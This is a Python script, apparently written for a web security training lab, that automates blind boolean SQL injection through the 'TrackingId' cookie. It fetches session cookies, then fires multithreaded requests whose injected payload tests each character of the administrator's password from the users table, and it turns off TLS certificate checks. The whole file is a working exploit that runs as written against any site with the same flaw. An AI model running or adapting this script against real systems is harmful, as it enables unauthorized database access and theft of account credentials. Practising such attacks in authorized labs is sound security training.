import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

# Suppress annoying InsecureRequestWarning warnings from urllib3
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
CHARACTERS = string.ascii_lowercase + string.digits
PASSWORD_LENGTH = 20
MAX_THREADS = 10  # Adjust based on lab rate limiting/stability

def fetch_initial_cookies(url):
    """Visits the lab homepage once to automatically catch valid session cookies."""
    print("[+] Initializing session and fetching cookies automatically...")
    session = requests.Session()
    try:
        # verify=False ignores SSL/TLS certificate errors
        response = session.get(url, timeout=10, verify=False)
        cookies = session.cookies.get_dict()
        
        tracking_id = cookies.get('TrackingId')
        session_id = cookies.get('session')
        
        if not tracking_id:
            print("[-] Critical Error: Could not find 'TrackingId' in response cookies.")
            print(f"[-] Current visible cookies: {cookies}")
            exit(1)
            
        print(f"[+] Successfully extracted TrackingId: {tracking_id}")
        print(f"[+] Successfully extracted session   : {session_id}")
        return tracking_id, session_id
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Network connection error during initialization: {e}")
        exit(1)

def test_character(url, position, char, tracking_id, session_id):
    """Tests a single character at a specific position using the extracted tracking ID."""
    payload = f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
    cookies = {
        'TrackingId': payload,
        'session': session_id
    }
    
    try:
        # verify=False ignores SSL/TLS certificate errors here too
        response = requests.get(url, cookies=cookies, timeout=10, verify=False)
        
        # Core Condition: Update this based on the lab's "True" condition response
        if "Welcome back!" in response.text:
            return position, char
    except requests.exceptions.RequestException:
        pass
    return position, None

def brute_force_password_automated():
    # Prompt user for the target URL dynamically
    target_url = input("[?] Enter the active lab URL: ").strip()
    
    # Ensure trailing slash is handled properly
    if not target_url.endswith("/"):
        target_url += "/"

    # Fetch tracking id and session id seamlessly
    tracking_id, session_id = fetch_initial_cookies(target_url)
    
    # Track positions and their matching character (1-indexed mapping)
    password_dict = {i: " " for i in range(1, PASSWORD_LENGTH + 1)}
    
    print(f"\n[+] Starting multithreaded extraction using {MAX_THREADS} threads...")
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        
        # Queue up tasks for every position and character combination
        for position in range(1, PASSWORD_LENGTH + 1):
            for char in CHARACTERS:
                futures.append(executor.submit(test_character, target_url, position, char, tracking_id, session_id))
        
        # Process results in real-time as they finish
        for future in as_completed(futures):
            position, char = future.result()
            if char:
                password_dict[position] = char
                # Reconstruct string layout for visual feedback
                current_pwd = "".join([password_dict[i] for i in range(1, PASSWORD_LENGTH + 1)])
                print(f"[+] Found character at position {position:02d}: {char} | Current layout: [{current_pwd.strip()}]")

    # Final assembly
    final_password = "".join([password_dict[i] for i in range(1, PASSWORD_LENGTH + 1)]).strip()
    print(f"\n[+] Extraction Complete!")
    print(f"[+] Final Administrator Password: {final_password}")

if __name__ == "__main__":
    brute_force_password_automated()
